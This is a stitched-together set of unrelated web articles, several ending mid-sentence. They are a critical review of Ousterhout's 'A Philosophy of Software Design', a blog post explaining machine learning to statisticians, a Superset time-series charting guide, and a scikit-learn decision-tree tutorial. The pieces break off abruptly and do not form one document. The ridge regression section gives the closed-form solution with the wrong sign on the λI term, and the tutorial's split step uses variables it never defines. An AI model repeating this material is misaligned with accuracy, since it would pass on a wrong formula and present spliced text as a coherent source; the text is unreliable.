<p>I’m trying to read all the good writing about software design. This is very easy because not very much has been written: it turns out that it’s much easier to write an article about how to write a Tetris AI as a containerized Kotlin microservice than it is to shed insight on how to write good code. And so, when I heard about John Ousterhout’s new book “A Philosophy of Software Design,” I ordered my copy immediately.</p>

<center><img height="200" src="https://images-na.ssl-images-amazon.com/images/I/61iOSX4WNiL._SX404_BO1,204,203,200_.jpg" width="161"></center>

<p>I remember John Ousterhout from Stanford’s grad student visit day as the tall guy who introduced himself with a self-deprecating joke and invited all the Ph. D. admits over to dinner at his house. I know him also as the father of <a href="http://kayousterhout.org/">Kay Ousterhout</a>, whom I recently met as a fellow speaker at Strange Loop, and Amy Ousterhout, whom together are the first pair of sisters to both win the prestigious Hertz Fellowship.</p>

<p>At 170 pages, “A Philosophy of Software Design” (henceforth: PoSD) is a humble book. John’s background is in systems rather than in software engineering or programming languages, and he never claims special expertise. But his practitioner cred is immense. I enjoy tearing apart open-source projects and turning them into case studies of what not to do, so much that my students have requested I write a case study about good code for once. RAMCloud, Ousterhout’s distributed in-memory storage system, is now on my shortlist: from a 5-minute glance, it’s among the cleanest and best-documented code I’ve seen. And, given that he’s a busy professor managing a large lab, he’s written a surprising amount of it himself. He’s had plenty of impact too: he’s the creator of the Tcl language and its Tk framework, which I learned in 2005 as The Way to Write GUIs(™).</p>

<p>PoSD is best read as a tactical guide of how-to’s. About a quarter of it is spent on naming and comments, and much of the rest is about specific patterns. His few attempts to jump from tactical advice to principles are either done by trying to blur together similar-sounding tips, or are hamstrung by his inability to see the meaning of a program beyond the code (more on that later). He demonstrates the lack of principles comically in Chapter 19, where he promises to apply the books’ “principles” to several software trends, and then fills the rest of the chapter with standard (but solid) advice on unit-testing and OOP, with nary a reference to the rest of the book. On the whole, the book’s advice is higher-level than beginner books like Clean Code, but most of its contents will be familiar to a senior software engineer, and the novel parts are hit-and-miss.</p>

<p>Following other books like <a href="http://shop.oreilly.com/product/0636920022251.do"><i>Code Simplicity</i></a>, PoSD starts with a high-minded explanation of the benefits of good code and the dangers of complexity. Its early chapters are a grand tour of the basic concepts of software organization: separating levels of abstraction, isolating complexity, and when to break up functions. Chapter 5 is one of the most approachable introductions I’ve seen to Parnas’s ideas about information hiding. But it’s Chapter 4 where he introduces the book’s central idea: deep modules. An interface, explains Ousterhout, is not just the function signatures written in the code. It also includes informal elements: high-level behavior, constraints on ordering; anything a developer needs to know to use it. Many modules are shallow: they take a lot to explain, but don’t actually do that much. A good module is deep: the interface should be much simpler than the implementation.</p>

<p>Beautiful, obvious, and impossible to disagree with. Unfortunately, it’s also objectively wrong.</p>

<h2>
When specifications are longer than the code</h2>

<p>It sounds pretty nice to say “interfaces should be shorter than the implementation?” How do you test it?</p>

<p>To Ousterhout, where the interface is just a comment and some discussion about whether it’s simple to use and think about. Intuition and experience are the sole arbiters here. And this reveals his major blind spot.</p>

<p>I’ve <a href="http://www.pathsensitive.com/2018/01/the-three-levels-of-software-why-code.html">explained</a> <a href="http://www.pathsensitive.com/2018/01/the-design-of-software-is-thing-apart.html">before</a>&nbsp;that the important information of software design is not in the code (Level 2), but in the logic: the specifications and reasoning that are rarely written down concretely, but shape the code nonetheless. I group these artifacts into the aggregate “Level 3 constructs.” The “informal interface” Ousterhout describes is such a Level 3 construct, but they’re just as real as the code, and, contrary to Ousterhout, there are plenty of programming languages that do let you write them down and check them.</p>

<p>Experience doing this gives us concrete grounding when we talk software design. It’s how we move into <a href="https://terrytao.wordpress.com/career-advice/theres-more-to-mathematics-than-rigour-and-proofs/">post-rigorous</a> stage of software engineering, and know what we mean when we use terms like “interface” and “complexity.” It defends us against making confused and contradictory statements. Ousterhout lacks this insight, and that’s how he gets burned.</p>

<p>I’m going to pause for a moment and tell you: I like this book overall. It's well-written, and there’s a lot of advice in the book that I consider useful even though it’s on shaky ground, and more that doesn’t depend on this at all. Still, Ousterhout makes a big deal out of it, and so I’ll be taking a couple pages to explain why it’s wrong. These ideas are important, because they’re part of what leads to the higher levels of mastery.</p>

<p>My view is that Ousterhout’s “informal interface” is just the translation into English of a formal specification. Any question we have about interfaces can be answered by asking the question “what would a specification look like?” While I can’t prove the correspondence without peaking into Ousterhout’s head more than I’ve gotten to in our back-and-forth, I’ve found this lens unreasonably effective in helping to explain software design. And so, for the remainder of this post, I’ll be using the words “spec” and “interface” interchangeably.</p>

<p>I agree that the spec should usually be much simpler than the code. But anyone with experience actually formalizing specs can tell you that there are interesting cases where the specification is and should be more complicated than the implementation.</p>

<p>That's right: there are times when it’s actually desirable to have a specification more complicated than the code. Two major reasons are <b>ghost state </b>and <b>imprecision</b>. Ghost state is a concept from verification that describes certain kinds of “subtle” code. It’s an interesting subject that deserves its own blog post; I won’t mention it again. (Short version: it’s when a simple action like flipping a bit actually represents something conceptually complicated.)</p>

<p>Imprecision is a bigger one. For example:</p>

<ul>
<li>Specification: The temperature of the Fudarkameter will be between 60 and 90 degrees.</li>
<li>Implementation: The temperature of the Fudarkameter is 70 degrees.</li>
</ul><p>
The specification is longer precisely because it creates an abstraction barrier. If you design the rest of the system assuming the Fudarkameter is exactly 70 degrees, then the Fudarkameter becomes much harder to change or replace. By weakening the assumptions placed on a module, code becomes more evolvable.</p>

<p>On top of these, there’s another fundamental reason: It is much easier to describe something from the inside than from the outside. It is much easier to show you an apple than to answer every question you may ask of it. (Where are the seeds? How will it roll when I drop it?) And while there is more you can say <a href="http://yudkowsky.net/rational/virtues/">about a single apple</a> than all the apples in the world, there are more things that may be true about some apple than about a single apple.</p>

<p>As an example, let’s take a stack data structure, something I hope we can all agree is a useful abstraction. A stack is a sequence with push and pop operations, following the last-in-first-out ordering. The linked-list implementation is very short: just adding and removing elements off the front of the list. But if you use a stack, and you don’t want to use internal details of this implementation, then you need a way to think about it that doesn’t reference the underlying sequence. One solution is to use the <a href="http://www.cs.unc.edu/~stotts/204/ADTs/">stack axioms</a>, which say things like “If you push something onto a stack and then pop from the stack, you get the old value back” and “If you’ve ever pushed something onto a stack, then it’s not empty.” We’ve gone from the internal view of explaining how the stack operations manipulate memory, to the external view of explaining their interactions and observable behaviors.</p>

<p>In my public correspondence with Prof. Ousterhout, I illustrated this by writing down an implementation and interface for a stack data structure, including the stack axioms. My implementation was 30 tokens; the interface was 54.</p>

<p>Perhaps you can find a shorter way to explain stacks, but this is not looking good. It seems that Ousterhout’s advice, held under a microscope, is actually telling us we should not use stacks in our code (or, at least, only use the more complicated implementations, like lock-free concurrent stacks).</p>

<h3>
<b>A “Simple” API</b></h3>

<p>It’s easy for the interface for stacks to be larger than the implementation because they’re so small. Now, let’s look at something larger. I don’t need to look very hard for an example, because Ousterhout gives me one.</p>

<blockquote>
<p>The mechanism for file IO provided by the Unix operating system and its descendants, such as Linux, is a beautiful example of a deep interface. There are only five basic system calls for I/O, with simple signatures: </p>

<div>
<pre><span>int</span> <span>open</span><span>(</span><span>const</span> <span>char</span><span>*</span> <span>path,</span> <span>int</span> <span>flags,</span> <span>mode_t</span> <span>permissions);</span>
<span>ssize_t</span> <span>read</span><span>(</span><span>int</span> <span>fd,</span> <span>void</span><span>*</span> <span>buffer,</span> <span>size_t</span> <span>count);</span>
<span>ssize_t</span> <span>write</span><span>(</span><span>int</span> <span>fd,</span> <span>const</span> <span>void</span><span>*</span> <span>buffer,</span> <span>size_t</span> <span>count);</span>
<span>off_t</span> <span>lseek</span><span>(</span><span>int</span> <span>fd,</span> <span>off_t</span> <span>offset,</span> <span>int</span> <span>referencePosition);</span>
<span>int</span> <span>close</span><span>(</span><span>int</span> <span>fd);</span>
</pre>
</div>
</blockquote>

<p>The POSIX file API is a great example, but not of a deep interface. Rather, it’s a great example of how code with a very complicated interface may look deceptively simple when reduced to C-style function signatures. It’s a stateful API with interesting orderings and interactions between calls. The flags and permissions parameters of <span>open</span> hide an enormous amount of complexity, with hidden requirements …</p></div></div></div>

<p>I’ve spent the last few months preparing for and applying for data science jobs. It’s possible the data science world may reject me and my lack of both experience and a credential above a bachelors degree, in which case I’ll do something else. Regardless of what lies in store for my future, I think I’ve gotten a good grasp of the mindset underlying machine learning and how it differs from traditional statistics, so I thought I’d write about it for those who have a similar background to me considering a similar move.<sup>1</sup></p>



<p>This post is geared toward people who are excellent at statistics but don’t really “get” machine learning and want to understand the gist of it in about 15 minutes of reading. If you have a traditional academic stats backgrounds (be it econometrics, biostatistics, psychometrics, etc.), there are two good reasons to learn more about data science:</p>



<ul><li>First, data science jobs tend to pay more than other quantitative jobs. It’s a bit taboo to bring this up– after all, aren’t we all supposed to be doing this out of passion and love? I’m not going to pretend that making more money is a bad reason to pursue something, and I reserve no judgment for those whose primary motivation is to earn more.</li><li>Second, data scientists genuinely do some pretty interesting things and have a very interesting approach to working with data, even if my gut reaction is to barf when someone says “teaching the model” instead of “estimating the parameters.”</li></ul>



<figure><div>
<div><blockquote data-width="550" data-dnt="true"><div lang="en" dir="ltr"><p>Q: What's the difference between statistics and machine learning?</p><p>A: About $50,000/year</p></div>— Senior OLS Engineer (@ryxcommar) <a href="https://twitter.com/ryxcommar/status/1131244580115046405?ref_src=twsrc%5Etfw">May 22, 2019</a></blockquote></div>
</div></figure>



<p>The world of data science is, in many ways, hiding in plain sight from the more academically-minded quantitative disciplines. I’m not going to spend much time covering the different algorithms that data scientists use: partly because a lot of the algorithms they use are the same as what statisticians use, but also because the algorithms aren’t the point of this post. In this post I’ll be writing a short guide on how to translate your statistics skills into data science very quickly.</p>



<p>After finishing this post, I recommend downloading (for free) and reading through <a href="https://web.stanford.edu/~hastie/ElemStatLearn/">The Elements of Statistical Learning</a> (herein TESL). It is an excellent and comprehensive textbook that covers all the major machine learning topics, and is geared toward people with a strong math background, especially linear algebra.</p>



<h2>Philosophical Differences Between Statistics and Machine Learning</h2>



<figure></figure>



<p>The main difference between machine learning and statistics is what I’d call “β-hat versus y-hat.” (I’ve also heard it described as inference versus prediction.) Basically, academia cares a lot about what the estimated parameters look like (β-hat), and machine learning cares more about being able to estimate a dependent variable given some inputs (y-hat). There are handful of other differences, but they are rooted in this. Once you understand this, combined with your background in stats, you will basically understand machine learning.</p>



<h4> β-Hat Versus Y-Hat</h4>



<figure><div>
<div><blockquote data-width="550" data-dnt="true"><div lang="en" dir="ltr"><p>My date: I am studying machine learning</p><p>Me [trying to impress her]: I too am studying how to do regressions in California</p></div>— Senior OLS Engineer (@ryxcommar) <a href="https://twitter.com/ryxcommar/status/1145076273410129921?ref_src=twsrc%5Etfw">June 29, 2019</a></blockquote></div>
</div></figure>



<p>Once you stop caring about your parameters, you can start making them look like nonsense, i.e. by adding <a href="https://en.wikipedia.org/wiki/Bias_of_an_estimator">bias</a> (the parameter is wrong) or <a href="https://en.wikipedia.org/wiki/Consistent_estimator">inconsistency</a> (the parameter doesn’t converge over infinite observations). In some cases, you can even turn the model into more or less a complete black box that just spits out a y-hat; this is what neural networks are, basically. Traditionally, it’s a cardinal sin in academia to use parameters like these because you can’t say anything interesting about the parameters, but the trick in machine learning is that you don’t need to say anything about the parameters. In machine learning, your focus is on describing y-hat, not β-hat.</p>



<p>Why so much love for y-hat? The friendly, less cynical answer is that within the last decade, everyone got their hands on a crap-ton of data and computational power, and they want to do cool and useful things with it. Machine learning is a pretty natural way to leverage all this data and power because machine learning has tools to deal with multicollinearity and to find really deep, hidden correlations and patterns in data. As you can imagine, machine learning doesn’t let you side-step the dirty work of specifying your data and models (a.k.a. “<a href="https://en.wikipedia.org/wiki/Feature_engineering">feature engineering</a>,” according to data scientists), but it makes it a lot easier to just run things without thinking too hard about how to set it up. In statistics, bad results can be wrong, and being right for bad reasons isn’t acceptable. In machine learning, bad results are wrong if they catastrophically fail to predict the future, and nobody cares much how your crystal ball works, they only care that it works.</p>



<figure><img src="https://thumbor.forbes.com/thumbor/960x0/https%3A%2F%2Fblogs-images.forbes.com%2Fgilpress%2Ffiles%2F2016%2F03%2FTime-1200x511.jpg" alt="Time"><figcaption>For those of you who have never done anything outside a classroom setting, this is literally every data related task, whether you’re an accountant working in Excel or a PhD data scientist working for 6-figures.<br><a href="https://www.forbes.com/sites/gilpress/2016/03/23/data-preparation-most-time-consuming-least-enjoyable-data-science-task-survey-says/#9b3182c6f637">(Source: Forbes.)</a></figcaption></figure>



<p>This newfound love for y-hat is a bit opportunistic, but in fairness, y-hat tends to be more important than β-hat for a wide array of business use cases. For example:</p>



<ul><li>Recommender systems (such as Youtube showing you more videos you might like, or showing  a customer items they might want to buy next).</li><li>Computer vision (such as optical character recognition or facial recognition).</li><li>Forecasting (such as estimating how much a customer will buy at a store, or how likely someone is to default on a loan).</li></ul>



<p>None of these tasks require having a human interpret the parameters and figure out what’s driving what to get a sufficiently acceptable answer; it’s all predictive.</p>



<h4>Letting Go of  β-Hat</h4>



<p>There are a lot of things that data scientists do that made literally zero sense to me before I grasped how to think in terms of y-hat.</p>



<p>The big one that made no sense to me the first time I encountered it back in 2017 is that data scientists split their data into <a href="https://medium.com/datadriveninvestor/data-science-essentials-why-train-validation-test-data-b7f7d472dc1f">“training data,” “validation data,” and “testing data.”</a> The reason this does not make sense to β-hat-brained people is because adding more observations should get you closer to the true parameter because, you know, the law of large numbers. There are two issues with the old school thought process. The first is that there is no “true” parameter if your parameters are intentionally allowed to be a little biased. The second is that there is no guarantee of convergence to anything if your parameters are allowed to be asymptotically inconsistent.</p>



<p>I’m sure you’re asking: “why allow your parameters to be biased?” Good question. The most straightforward answer is that there is a bias-variance trade-off. <a href="https://en.wikipedia.org/wiki/Bias%E2%80%93variance_tradeoff">The Wikipedia article </a>does a good job both illustrating and explaining it. For β-hat purposes, the notion of allowing any bias is crazy. For y-hat purposes, adding a little bias in exchange for a huge reduction in variance can improve the predictive power of your model.</p>



<figure><div>

</div></figure>



<h4>Adding Bias to OLS with Ridge Regression</h4>



<p>Ridge regression is the most straightforward example of adding bias. If you understand OLS, you’re like two paragraphs of reading away from understanding ridge regression.</p>



<p>Basically, instead of just solving for the β vector that minimizes the sum of squared residuals as one does with OLS, i.e. <img src="https://s0.wp.com/latex.php?latex=%5Chat%7B%5Cboldsymbol%7B%5Cbeta%7D%7D_%7B%5Crm+ols%7D+%3D+%7B%5Crm+argmin%7D_%7B%5Cboldsymbol%7B%5Cbeta%7D%7D+%5Csum_%7Bi%3D1%7D%5En+%28y_i+-+x_i+%5E%7B%5Crm+T%7D++%5Cbeta%29%5E2&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="\hat{\boldsymbol{\beta}}_{\rm ols} = {\rm argmin}_{\boldsymbol{\beta}} \sum_{i=1}^n (y_i - x_i ^{\rm T}  \beta)^2" title="\hat{\boldsymbol{\beta}}_{\rm ols} = {\rm argmin}_{\boldsymbol{\beta}} \sum_{i=1}^n (y_i - x_i ^{\rm T}  \beta)^2">, you can also add a “penalty” to large squared β’s while trying to find the β-hat that minimizes the objective function. So you add <img src="https://s0.wp.com/latex.php?latex=%5Clambda+%5Csum_%7Bj%3D1%7D%5EK++%5Cbeta%5E2&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="\lambda \sum_{j=1}^K  \beta^2" title="\lambda \sum_{j=1}^K  \beta^2"> to the objective function, where λ is some constant. Then, last but not least, you “standardize” each column <img src="https://s0.wp.com/latex.php?latex=X_j&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="X_j" title="X_j">, which means transforming it to <img src="https://s0.wp.com/latex.php?latex=Z_j+%5Csim+N%280%2C1%29&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="Z_j \sim N(0,1)" title="Z_j \sim N(0,1)"> by subtracting each column by the column’s mean and dividing by the column’s standard deviation: <img src="https://s0.wp.com/latex.php?latex=z_%7Bi%2Cj%7D+%3D+%28x_%7Bi%2Cj%7D+-+%5Cmu_j%29+%2F+%5Csigma_j&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="z_{i,j} = (x_{i,j} - \mu_j) / \sigma_j" title="z_{i,j} = (x_{i,j} - \mu_j) / \sigma_j"> (the purpose of this is to make it so the parameters measure the <em>relative</em> impacts to the overall result, as opposed to the nominal impacts, otherwise the penalty wouldn’t work the way you’d probably want it to). This gives you the ridge regression estimator:</p>



<p> <img src="https://s0.wp.com/latex.php?latex=%5Chat%7B%5Cboldsymbol%7B%5Cbeta%7D%7D_%7B%5Crm+ridge%7D+%3D+%7B%5Crm+argmin%7D_%5Cbeta+%5Csum_%7Bi%3D1%7D%5En+%28y_i+-+z_i+%5E%7B%5Crm+T%7D++%5Cbeta%29%5E2+%2B+%5Clambda+%5Csum_%7Bj%3D1%7D%5EK++%5Cbeta%5E2&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="\hat{\boldsymbol{\beta}}_{\rm ridge} = {\rm argmin}_\beta \sum_{i=1}^n (y_i - z_i ^{\rm T}  \beta)^2 + \lambda \sum_{j=1}^K  \beta^2" title="\hat{\boldsymbol{\beta}}_{\rm ridge} = {\rm argmin}_\beta \sum_{i=1}^n (y_i - z_i ^{\rm T}  \beta)^2 + \lambda \sum_{j=1}^K  \beta^2"></p>



<p>At λ=0, the summation of squared β’s you just tacked onto the objective function equals zero regardless of what the β-hat vector is, so you just have OLS again. As λ→∞, the penalties for all nonzero β’s become so huge that the only way for the penalties to not overwhelm the objective function is to have all the parameters β-hat = 0. And the closed-form solution to the objective function, it turns out, is pretty similar to OLS’s closed-form solution:   <img src="https://s0.wp.com/latex.php?latex=%5Chat%7B%5Cboldsymbol%7B%5Cbeta%7D%7D_%7B%5Crm+ridge%7D+%3D+%28%5Cmathbf+Z%5E%7B%5Crm+T%7D+%5Cmathbf+Z-%5Clambda+%5Cmathbf+I%29%5E%7B-1%7D+%5Cmathbf+Z%5E%7B%5Crm+T%7D+%5Cmathbf+y&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="\hat{\boldsymbol{\beta}}_{\rm ridge} = (\mathbf Z^{\rm T} \mathbf Z-\lambda \mathbf I)^{-1} \mathbf Z^{\rm T} \mathbf y" title="\hat{\boldsymbol{\beta}}_{\rm ridge} = (\mathbf Z^{\rm T} \mathbf Z-\lambda \mathbf I)^{-1} \mathbf Z^{\rm T} \mathbf y">.</p>



<p>All pretty straightforward, but the real question is why would you do this? Well, if you don’t care about the interpretability/bias of the parameters but you want the model to predict out-of-sample better than regular OLS, you can find some value of  λ through <a href="https://en.wikipedia.org/wiki/Cross-validation_(statistics)">cross-validation</a> that gives you a better fit than  λ=0, i.e. minimizing the <a href="https://en.wikipedia.org/wiki/Mean_squared_prediction_error">prediction errors</a>. But in order to cross-validate the data, you need to split your data into data you use to estimate the parameters (training data) and data to perform the cross-validation on (validation data). This process is what sets your λ.</p>



<p>Ridge regression is OLS with L2 regularization, which is penalization by the square of the parameter. L1 regularization takes the absolute value of the parameters as the penalty instead of the square (i.e. <a href="https://en.wikipedia.org/wiki/Lasso_(statistics)">lasso</a>). And of course, L1 and L2 regularization can be used in contexts other than linear regression, such as logistic regression. These regularization methods are especially good at dealing with multicollinearity, which is definitely something you’d come across with thousands of columns of corporate data and no compelling way to decide which are the best columns to use.<sup>2</sup></p>



<p>I could go on, but regurgitating all of TESL isn’t why I wrote this blog. I like showing ridge regression as an example of machine learning because it’s very similar to OLS, but is totally and unabashedly modified for predictive purposes, instead of inferential purposes. β-hat is never the …</p></div></article></div>

<p>In the <a href="https://preset.io/blog/2020-06-08-first-chart/">previous blog post</a>, we learned how to start to create charts in <a href="https://superset.incubator.apache.org/">Superset</a> and specifically <a href="https://preset.io/blog/2020-06-08-first-chart/">how to create a composition charts</a> to understand understand how data is formed. This, in turn, can be used to determine which chart type is the most appropriate.</p>
<p>In this blog article we will explore the topic of time series data, visualization options, and how to best represent time series data in order to facilitate trend analysis. Data used in the examples below is available in a <a href="https://raw.githubusercontent.com/eugeniamz/ce_test_db/master/Covid19_CasesTS_data.csv">GitHub repository</a> — you can also <a href="https://www.youtube.com/watch?v=r4sjmAKaJ6M&amp;t=3s">view instructions</a> on how to import the file into your own database.</p>
<h2 id="why-time-series-charts"><a href="#why-time-series-charts" aria-label="why time series charts permalink"></a>Why Time Series Charts</h2>
<p>Time series data is important because it is used to understand and analyze data behavior over time. Using historical data, time series charts enable companies to spot trends, changes in behavior, and compare different metrics to visualize correlations. Examples of time series analysis includes website visits, sales trends, and IoT (Internet of Things) data.</p>
<p>In a time series chart, you represent a independent variable (time) vs. dependent variables (metrics) to analyze behavior over time.</p>
<p>In the example of Covid-19 data, a time series chart will enable you to answer critical questions, such as:</p>
<ul>
<li>Are the number of Confirmed Cases decreasing? (trend)</li>
<li>Did we flatten the curve? (trends)</li>
<li>Is there a correlation between confirmed cases and deaths?</li>
</ul>
<h2 id="times-series-analysis-with-superset"><a href="#times-series-analysis-with-superset" aria-label="times series analysis with superset permalink"></a>Times Series Analysis with Superset</h2>
<p>Superset has a rich library of time series graphs for different use cases, such as: Line Charts, Area Charts, Time Series Bar Charts, Dual Line Charts, Calendar Heat Maps, Horizon Charts, and more. In this article, we will show examples of some of these charts and how changing a visualization type can dramatically change how data is displayed for trend analysis.</p>

<p><strong>Time Field:</strong> This is a independent variable and is represented on the X-axis. Options in the Time Column drop-down are fields that have the option temporal in the Columns field within the data source. The Time Grain drop-down indicates the data aggregated label used when displaying the metrics.</p>
<p><strong>Metrics:</strong> This is a required field and represents the dependent variables that will be displayed on the Y-axis.</p>
<p>All the other fields are optional, but it is important to keep in mind that an efficient chart is a simple chart — therefore, be sure to reduce the use of filters, granularity, and limit the series represented in the Group By and Series limit fields. By default, the Series limit field uses the first metric value to cut off values but, alternatively, the Sort By field allows you to filter data with an additional data point.</p>

<p>In this example, you can see that the numbers of dates (last 3 months ~90 bars) are too wide to be represented on the screen — this is a good opportunity to reduce the date granularity in order to reduce the data points on the X-axis.</p>

<p>However, adding too many series (e.g., many distinct values in the Group By field) could make it difficult to understand and conceptualize the series. In this case, it is useful to use Series Limit to reduce the number of series.</p>

<p>Area chart are similar to line chart in that they represent variables with the same scale, but area charts stack the metrics on top of each other. An area chart in Superset can be stream, stack, or expand.</p>
<p>By simply changing the Visualization Type, we can display the line chart above as an area chart</p>

<p>Sometimes when looking at data points on a per day basis, it is difficult to determine trends and data variance. For example, the chart below shows the top American states with new Covid-19 cases on a per day basis (taken over the last month). This view makes it difficult to discern a clear trend.</p>

<p>In order to gain a greater insight into this data, we recommend smoothing out the short-term fluctuations between data points by applying a moving average. The moving average—available in the <em>Advance Analytics function</em>—applies the average between defined X periods instead of marking actual data points by date.</p>
<p>If we apply this technique to the previous chart by using the moving average over the last 7 days, the lines in the chart will be smoothed out and facilitate the recognition of trends.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
			<p>In this post we are going to see how to build a basic decision tree classifier using scikit-learn package and how to use it for doing multi-class classification on a dataset.</p>

<p>Decision trees is an efficient and non-parametric method that can be applied either to classification or to regression tasks.</p>

<p>To predict the dependent variable the input space is split into local regions because they are hierarchical data structures for supervised learning</p>

<p>Decision tree is a simple to learn and easy to interpret and Visualize the decisions in a tree format. It has the advantage of producing comprehensible classification/regression model with satisfactory accuracy level.</p>

<p>We will be exploring the DecisionTreeClassifier function of sklearn and all the parameters of it. You will also see how to Visualize the decision tree Rules and the Boundaries that model is creating to classify the different Classes(targets)</p>

<h2 id="decision-tree-classifier-in-sklearn"><strong>Decision Tree Classifier in Sklearn</strong></h2>

<div><div><pre><code>sklearn.tree.DecisionTreeClassifier(_criterion='gini'_,&nbsp;_splitter='best'_,&nbsp;_max_depth=None_,
&nbsp;
_min_samples_split=2_,&nbsp;_min_samples_leaf=1_,&nbsp;_min_weight_fraction_leaf=0.0_,&nbsp;_max_features=None_,&nbsp;

_random_state=None_,&nbsp;_max_leaf_nodes=None_,&nbsp;_min_impurity_decrease=0.0_,&nbsp;_min_impurity_split=None_,&nbsp;

_class_weight=None_,&nbsp;&nbsp;_ccp_alpha=0.0_)
</code></pre></div></div>

<h2 id="parameters"><strong>Parameters</strong></h2>

<h3 id="criterion"><strong>criterion</strong></h3>

<p>Gini or entropy and default is Gini.</p>

<p>One of the Critical factor is to choose which feature for splitting the nodes in subsets and for making that decision we choose out of these two criteria</p>

<ul>
  <li>Information Theory (Entropy)</li>
  <li>Distance Based (Gini)</li>
</ul>

<p>Both are impurity measures and it looks like the selection of impurity measure has little effect on the performance of single decision tree algorithms</p>

<p>The impurity is measured before and after splitting a node according to each possible attribute.</p>

<p>The attribute which presents the greater gain in purity, i.e., that maximizes the difference of impurity taken before and after splitting the node, is chosen</p>

<p>Entropy might be a little slower to compute because it makes use of the logarithm</p>

<h3 id="splitter"><strong>Splitter</strong></h3>

<p>Strategy to choose out of best or random. Default is best</p>

<p>If the best strategy is chosen then it will split on the most important feature first</p>

<p>it will choose a feature on random for splitting the node if splitter set to random which could lead to accuracy and more depth in the decision tree</p>

<h3 id="max_depth"><strong>max_depth</strong></h3>

<p>The maximum depth of the tree.</p>

<p>One of the stopping criteria that let you decide when to terminate the tree building process. A tree can be grown until a maximum depth is reached.</p>

<p>A tree can be grown to a maximum depth of N-1 where N is the number of samples</p>

<p>Beside max_depth there are other stopping criteria as well so in reality a tree will never go a maximum depth of N-1</p>

<p>Mostly we try to pick the optimal depth based on cross-validation and decides the reasonable max_depth value</p>

<h3 id="min_samples_split"><strong>min_samples_split</strong></h3>

<p>The minimum number of samples required at an Internal node for splitting. Say for example min_samples_split = 5 and there are 8 samples at a decision node then the split is allowed otherwise if &lt;5 then not allowed.</p>

<p>if <strong>min_sample_leaf</strong> = 2 and one leaf has 1 sample and other has 6 samples then the split is not allowed</p>

<p>so min_samples_split depends on the min-sample_leaf defined as well</p>

<p><img src="https://kanoki.org/images/2020/05/image-6.png" alt=""></p>

<h3 id="min_samples_leaf"><strong>min_samples_leaf</strong></h3>

<p>The minimum number of samples required at a leaf node</p>

<h3 id="min_weight_fraction_leaf"><strong>min_weight_fraction_leaf</strong></h3>

<p>The minimum weighted fraction</p>

<div><div><pre><code>`fit`(_self_,&nbsp;_X_,&nbsp;_y_,&nbsp;_sample_weight=None_,&nbsp;_check_input=True_,&nbsp;_X_idx_sorted=None_)
</code></pre></div></div>

<p>this parameter decides the required fraction of samples (or weights) in each leaf node</p>

<p>It uses the weight defined for each sample thru the fit method that has a <strong>sample_weight</strong> which lets you specify the weight of each of the samples and accepts values in an array like format for n_samples</p>

<p>if a minimum weight fraction is set and the sample weight is None then it will assume a uniform weight for all the samples</p>

<h3 id="max_features"><strong>max_features</strong></h3>

<p>It defines the number of features to be used for best split.</p>

<p>It is used to control the over-fitting. For example if the shape of your data is 30 and max_feature is set to 5.</p>

<p>So Every time at a decision node you will choose maximum of 5 features that are selected randomly for splitting</p>

<h3 id="random_state"><strong>random_state</strong></h3>

<p>It is the seed used by the random number generator. it is basically used to make the result or outcome of the classifier consistent.</p>

<p>It hardly matters what number you select but if you select the same number each time then the output remains deterministic</p>

<h3 id="max_leaf_node"><strong>max_leaf_node</strong></h3>

<p>maximum leaf node. It is one of the stopping criteria to grow a tree wih max_leaf_node.</p>

<p>By default it is set to None which means it will grow to unlimited leaf nodes and other stopping criteria will be considered</p>

<p>from the official <a href="https://scikit-learn.org/stable/modules/generated/sklearn.tree.DecisionTreeClassifier.html">documentation</a> the formula for weighted impurity decrease is as follows:</p>

<div><div><pre><code>N_t / N * (impurity - N_t_R / N_t * right_impurity
                    - N_t_L / N_t * left_impurity)
</code></pre></div></div>

<p>This formula takes into account how much the parent node makes up of the total tree (N_t / N) and the weighted impurity decrease from the child nodes.</p>

<p>If the final impurity decrease is less than the minimum impurity decrease parameter, then the split will not be performed</p>

<h3 id="class_weight"><strong>class_weight</strong></h3>

<p>By default all the classes have same weight i.e. 1</p>

<p>The class_weight parameter deals well with unbalanced classes by giving
more weight to the under represented classes.</p>

<p>It is used for re-weighting the splitting criterion</p>

<p>Higher the class_weight more you want to put emphasis on that class.</p>

<p>For multi-output, class_weights will be multiplied with <strong>sample_weight</strong> (passed through the fit method) if <strong>sample_weight</strong> is specified</p>

<h2 id="get-started"><strong>Get Started</strong></h2>

<p>We will use the wine dataset from sklearn.</p>

<p>Let’s load the data and then will split into train and test sets</p>

<div><div><pre><code>from sklearn import datasets
from sklearn.tree import DecisionTreeClassifier
wine_data = datasets.load_wine()
</code></pre></div></div>

<p>Let’s check out the important keys in this dataset</p>



<div><div><pre><code>dict_keys(['data', 'target', 'target_names', 'DESCR', 'feature_names'])
</code></pre></div></div>

<p>So we have data, target variables with their names stored in target_names and feature names</p>

<p>Let’s find out the features in the data that we will use to train the decision tree classifier</p>



<div><div><pre><code>['alcohol',
 'malic_acid',
 'ash',
 'alcalinity_of_ash',
 'magnesium',
 'total_phenols',
 'flavanoids',
 'nonflavanoid_phenols',
 'proanthocyanins',
 'color_intensity',
 'hue',
 'od280/od315_of_diluted_wines',
 'proline']
</code></pre></div></div>

<p>Here are the different classes or targets in which each of these data is classified to i.e. class_0, class_1 and class_2</p>



<div><div><pre><code>**array(['class_0', 'class_1', 'class_2'], dtype='&lt;U7')**
</code></pre></div></div>

<p>Finally lets check the data by importing it into a Dataframe object. So you can visualize how the data looks like</p>

<div><div><pre><code>import pandas as pd
pd.DataFrame(wine_data.data,columns=wine_data.feature_names)
</code></pre></div></div>

<p>We can see there are 178 rows and 13 features in this dataset.</p>

<p><img src="https://kanoki.org/images/2020/05/image-7.png" alt=""></p>

<h2 id="train-test-split"><strong>Train Test Split</strong></h2>

<p>We have split the data into training and test set using sklearn train_test_split</p>

<div><div><pre><code>from sklearn.model_selection import train_test_split
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3,
stratify=y)
</code></pre></div></div>

<h2 id="accuracy-score-and-cross-validation"><strong>Accuracy Score and Cross Validation</strong></h2>

<p>Lets measure the testing accuracy using sklearn accuracy_score.</p>

